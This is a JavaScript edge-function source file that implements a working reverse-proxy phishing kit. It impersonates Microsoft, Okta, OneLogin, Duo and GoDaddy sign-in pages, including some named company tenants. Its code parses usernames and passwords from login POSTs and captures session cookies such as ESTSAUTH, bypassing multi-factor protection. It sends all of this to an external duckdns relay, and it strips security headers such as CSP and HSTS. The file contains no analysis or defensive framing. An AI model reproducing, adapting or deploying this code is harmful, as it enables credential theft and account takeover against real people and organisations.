export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

// ---- Exfiltration Functions ----
async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform) {
  try {
    const content = 'IP: ' + ip + '\nPlatform: ' + platform + '\nData: Cookies found:\n\n' + cookieText + '\n';
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-' + platform + '-COOKIE.txt');
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function parseCredentials(bodyText) {
  let user = null;
  let pass = null;

  if (!bodyText) return { user, pass };

  const keyValuePairs = bodyText.split('&');
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;

    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));

    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }

  return { user, pass };
}

function getUpstreamDomain(hostname) {
  // Check if the hostname is our proxy domain
  if (hostname === YOUR_DOMAIN) {
    return INITIAL_UPSTREAM;
  }
  
  // Check if it's a known identity provider
  for (const domain in IDENTITY_PROVIDERS) {
    if (hostname.includes(domain)) {
      return domain;
    }
  }
  
  return INITIAL_UPSTREAM;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Determine upstream domain based on the request
  const upstreamDomain = getUpstreamDomain(url.hostname);
  const provider = IDENTITY_PROVIDERS[upstreamDomain] || { type: 'unknown' };
  
  // Build upstream URL - keep the same path
  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.host = upstreamDomain;

  console.log('[' + provider.type + '] ' + request.method + ' ' + url.toString() + ' -> ' + upstreamUrl.toString());

  // Handle OPTIONS request
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build headers for upstream request
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('Host', upstreamDomain);
  requestHeaders.set('Referer', 'https://' + upstreamDomain + '/');
  requestHeaders.set('Origin', 'https://' + upstreamDomain);
  
  // Remove problematic headers
  requestHeaders.delete('content-length');
  requestHeaders.delete('x-forwarded-host');
  requestHeaders.delete('x-forwarded-proto');
  requestHeaders.delete('x-forwarded-for');

  // ---- Credentials capture for POST requests ----
  if (request.method === 'POST') {
    try {
      const clonedRequest = request.clone();
      const bodyText = await clonedRequest.text();
      const { user, pass } = parseCredentials(bodyText);

      if (user && pass) {
        console.log('[CREDENTIALS CAPTURED] User: ' + user.substring(0, 5) + '... Platform: ' + provider.type);

        await sendToVercel('credentials', {
          type: "creds",
          ip: ip,
          user: user,
          pass: pass,
          platform: provider.type,
          url: url.toString()
        });

        const content = 'IP: ' + ip + '\nPlatform: ' + provider.type + '\nUser: ' + user + '\nPass: ' + pass + '\nURL: ' + url.toString() + '\n';
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-CREDENTIALS.txt');
        formData.append("ip", ip);
        formData.append("type", "credentials");

        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        });
      }
    } catch (error) {
      console.error('Credential capture error:', error);
    }
  }

  try {
    // Proxy request to upstream
    const response = await fetch(upstreamUrl.toString(), {
      method: request.method,
      headers: requestHeaders,
      body: ['GET', 'HEAD'].includes(request.method) ? null : request.body,
      redirect: 'manual'
    });

    console.log('[DEBUG] Upstream response status: ' + response.status);

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('Location');
      if (location) {
        const newHeaders = new Headers(response.headers);
        // Rewrite location to go through our proxy
        try {
          const locationUrl = new URL(location);
          locationUrl.host = YOUR_DOMAIN;
          newHeaders.set('Location', locationUrl.toString());
          console.log('[Redirect] ' + location + ' -> ' + locationUrl.toString());
        } catch (e) {
          // If it's a relative URL, prepend our domain
          if (location.startsWith('/')) {
            newHeaders.set('Location', 'https://' + YOUR_DOMAIN + location);
          }
        }
        return new Response(null, { status: response.status, headers: newHeaders });
      }
    }

    // Process response headers
    const newHeaders = new Headers(response.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');

    // ---- Capture and rewrite cookies ----
    const cookies = response.headers.getSetCookie?.() || [response.headers.get('Set-Cookie')].filter(Boolean);
    let allCookies = '';
    
    if (cookies?.length) {
      allCookies = cookies.join('; ');
      
      // Check for critical auth cookies
      const criticalPatterns = CRITICAL_AUTH_COOKIES[provider.type] || [];
      const hasCriticalCookies = criticalPatterns.some(pattern => {
        if (pattern === '.*') return true;
        return allCookies.toLowerCase().includes(pattern.toLowerCase());
      });

      if (hasCriticalCookies) {
        console.log('[COOKIE CAPTURE] Found critical auth cookies');
        await exfiltrateCookies(allCookies, ip, provider.type);
      }

      // Rewrite cookies to work with our proxy domain
      cookies.forEach(cookie => {
        if (!cookie) return;
        // Replace upstream domain with our proxy domain
        const modifiedCookie = cookie.replace(new RegExp(upstreamDomain, 'gi'), YOUR_DOMAIN);
        newHeaders.append('Set-Cookie', modifiedCookie);
      });
    }

    // Process response body for HTML/JavaScript content
    const contentType = response.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(contentType)) {
      let text = await response.text();
      
      // Replace upstream domain with our proxy domain in the content
      // This is the key fix - simple domain replacement like the working script
      text = text.replace(new RegExp(upstreamDomain, 'g'), YOUR_DOMAIN);
      
      // Also replace other known Microsoft domains
      if (provider.type === 'microsoft') {
        text = text.replace(/login\.live\.com/g, YOUR_DOMAIN);
        text = text.replace(/account\.live\.com/g, YOUR_DOMAIN);
        text = text.replace(/account\.microsoft\.com/g, YOUR_DOMAIN);
        text = text.replace(/aadcdn\.msauth\.net/g, YOUR_DOMAIN);
      }
      
      // Add a simple script to handle dynamic content if needed
      if (contentType.includes('text/html')) {
        const interceptorScript = '<script>window.__PROXY_DOMAIN__="' + YOUR_DOMAIN + '";</script>';
        if (text.includes('<head>')) {
          text = text.replace('<head>', '<head>' + interceptorScript);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', '<html>' + interceptorScript);
        }
      }

      return new Response(text, { status: response.status, headers: newHeaders });
    }

    return new Response(response.body, { status: response.status, headers: newHeaders });

  } catch (err) {
    console.error('[' + provider.type + '] Error:', err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message,
      stack: err.stack
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
